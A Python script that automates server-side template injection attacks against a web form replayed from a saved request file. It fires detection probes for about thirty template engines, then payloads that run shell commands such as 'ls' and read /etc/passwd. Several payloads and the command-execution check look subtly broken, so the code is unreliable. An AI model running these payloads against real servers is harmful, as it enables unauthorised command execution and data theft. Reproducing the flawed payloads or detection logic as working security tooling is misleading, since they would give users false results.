import requests
from urllib.parse import parse_qs

# Define payloads for different template engines
payloads = {
    "Generic": "{{7*7}}",
    "Java": "${7*7}",
    "FreeMarker": "${7*7}",
    "Velocity": "#${7*7}",
    "Thymeleaf": "${7*7}",
    "Spring Framework": "${7*7}",
    "Spring View Manipulation": "${7*7}",
    "Pebble": "{{7*7}}",
    "Jinjava": "{{7*7}}",
    "Hubspot - HuBL": "{{7*7}}",
    "Expression Language - EL": "${7*7}",
    "Groovy": "${7*7}",
    "smarty": "{{$smarty.math(7,7,'*')}}",
    "Twig": "{{ 7*7 }}",
    "Plates": "{{ 7*7 }}",
    "PHPlib": "{{7*7}}",
    "Jade": "#{7*7}",
    "patTemplate": "#{7*7}",
    "Handlebars": "{{7*7}}",
    "JsRender": "{{:js7*7}}",
    "PugJs": "#{7*7}",
    "NUNJUCKS": "{{7*7}}",
    "ERB": "<%= 7*7 %>",
    "Slim": "= 7*7",
    "Python": "{{ 7*7 }}",
    "Tornado": "{{ 7*7 }}",
    "Jinja2": "{{ 7*7 }}",
    "Mako": "${7*7}",
    "Razor": "@(7*7)",
    "ASP": "<%# 7*7 %>",
    "Mojolicious": "{{7*7}}"
}

# Define command payloads for checking command execution capabilities
command_payloads = {
    "Generic": "{{7*7}}",
    "Java": "${7*7}",
    "FreeMarker": "${'${' + 'new java.lang.ProcessBuilder(\"ls\").start().getInputStream().text'}'}",
    "Velocity": "#${7*7}",
    "Thymeleaf": "${T(java.lang.Runtime).getRuntime().exec('ls').text}",
    "Spring Framework": "${T(java.lang.Runtime).getRuntime().exec('ls').text}",
    "Spring View Manipulation": "${T(java.lang.Runtime).getRuntime().exec('ls').text}",
    "Pebble": "{{ runtime.exec('ls').text }}",
    "Jinjava": "{{ system('ls') }}",
    "Hubspot - HuBL": "{{ system('ls') }}",
    "Expression Language - EL": "${'${' + 'new java.lang.ProcessBuilder(\"ls\").start().getInputStream().text'}'}",
    "Groovy": "${new File('/etc/passwd').text}",
    "smarty": "{{$smarty.eval('ls')}}",
    "Twig": "{{ system('ls') }}",
    "Plates": "{{ system('ls') }}",
    "PHPlib": "{{ exec('ls') }}",
    "Jade": "#{`ls`}",
    "patTemplate": "#{`ls`}",
    "Handlebars": "{{#system 'ls'}}",
    "JsRender": "{{:jsRuntime.eval('ls')}}",
    "PugJs": "#{`ls`}",
    "NUNJUCKS": "{{ exec('ls') }}",
    "ERB": "<%= `ls` %>",
    "Slim": "= `ls`",
    "Python": "{{'ls' | system}}",
    "Tornado": "{{ subprocess.Popen(['ls'], stdout=subprocess.PIPE).communicate()[0] }}",
    "Jinja2": "{{ ''.join(subprocess.Popen(['ls'], stdout=subprocess.PIPE).communicate()) }}",
    "Mako": "${subprocess.Popen(['ls'], stdout=subprocess.PIPE).communicate()[0]}",
    "Razor": "@(new System.Diagnostics.Process() { StartInfo = new System.Diagnostics.ProcessStartInfo('ls', '/etc/passwd', RedirectStandardOutput = true) }).StandardOutput.ReadToEnd()",
    "ASP": "<%= New-Object System.Diagnostics.ProcessStartInfo 'ls' | Out-String %>",
    "Mojolicious": "{{`ls`}}"
}

def read_request_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    request_info = {
        'method': lines[0].split()[0],
        'url': lines[0].split()[1],
        'headers': {},
        'body': None
    }

    # Extract headers and body
    for i, line in enumerate(lines[1:]):
        if line.strip() == "":
            request_info['body'] = "".join(lines[i+2:]).strip()
            break
        key, value = line.split(":", 1)
        request_info['headers'][key.strip()] = value.strip()
    
    return request_info

def extract_variables(body):
    # Parse the body to extract variables
    variables = parse_qs(body)
    return {k: v[0] for k, v in variables.items()}

def modify_and_send_request(request_info, variable_name, payload):
    # Extract and modify the request body
    variables = extract_variables(request_info['body'])
    
    # Modify the specific variable
    variables[variable_name] = payload
    modified_body = "&".join([f"{k}={v}" for k, v in variables.items()])

    # Send the modified request
    url = f"http://{request_info['headers']['Host']}{request_info['url']}"
    response = requests.post(url, headers=request_info['headers'], data=modified_body)

    return response.text

def check_for_ssti(response_text):
    return "49" in response_text

def check_command_execution(request_info, variable_name, language):
    command_payload = command_payloads.get(language, "")
    if command_payload:
        response_text = modify_and_send_request(request_info, variable_name, command_payload)
        return response_text
    return ""

def main():
    # Read request.txt
    request_info = read_request_file("SSTI/request.txt")

    # Extract variables from the request body
    variables = extract_variables(request_info['body'])
    variable_name = list(variables.keys())[0]  # Automatically use the first variable for simplicity

    for lang, payload in payloads.items():
        response_text = modify_and_send_request(request_info, variable_name, payload)
        if check_for_ssti(response_text):
            print(f"The template language {lang} is vulnerable to SSTI.")
            
            # Check for command execution
            output = check_command_execution(request_info, variable_name, lang)
            if any(cmd in output for cmd in command_payloads.values()):
                print(f"The template language {lang} allows command execution.")
                return  # Exit after finding the first vulnerable language that allows command execution
            
            print(f"The template language {lang} is vulnerable to SSTI but does not allow command execution.")
            return
    
    print("No template language detected as vulnerable.")

if __name__ == "__main__":
    main()
